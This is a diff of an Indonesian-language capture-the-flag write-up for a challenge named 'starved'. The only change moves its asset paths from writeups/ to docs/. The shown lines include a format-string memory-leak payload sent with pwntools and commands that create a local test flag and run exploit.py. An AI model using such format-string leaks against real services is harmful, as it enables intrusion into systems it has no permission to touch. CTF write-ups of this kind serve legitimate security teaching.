@@ -2,7 +2,7 @@
 
 [← Overview](40-starved.md) · [Index](index.md)
 
-> **Langkah 5/9 — Eksploitasi.** Tersimpan di writeups/assets/starved/exploit.py:
+> **Langkah 5/9 — Eksploitasi.** Tersimpan di docs/assets/starved/exploit.py:
 >
 > **Titik penting:** python3 exploit.py \| tee 03-exploit-run.txt · NFX{LOCAL_TEST_FLAG_STARVED}
 >
@@ -31,7 +31,7 @@
 
 ## 3.2 Script exploit
 
-Tersimpan di `writeups/assets/starved/exploit.py`:
+Tersimpan di `docs/assets/starved/exploit.py`:
 
 ```python
 p.sendline(b'%27$p|%29$p|%85$p')
@@ -60,7 +60,7 @@ p.send(payload)
 Menjalankan:
 
 ```bash
-cd writeups/assets/starved
+cd docs/assets/starved
 echo 'NFX{LOCAL_TEST_FLAG_STARVED}' > flag.txt
 python3 exploit.py | tee 03-exploit-run.txt
 ```
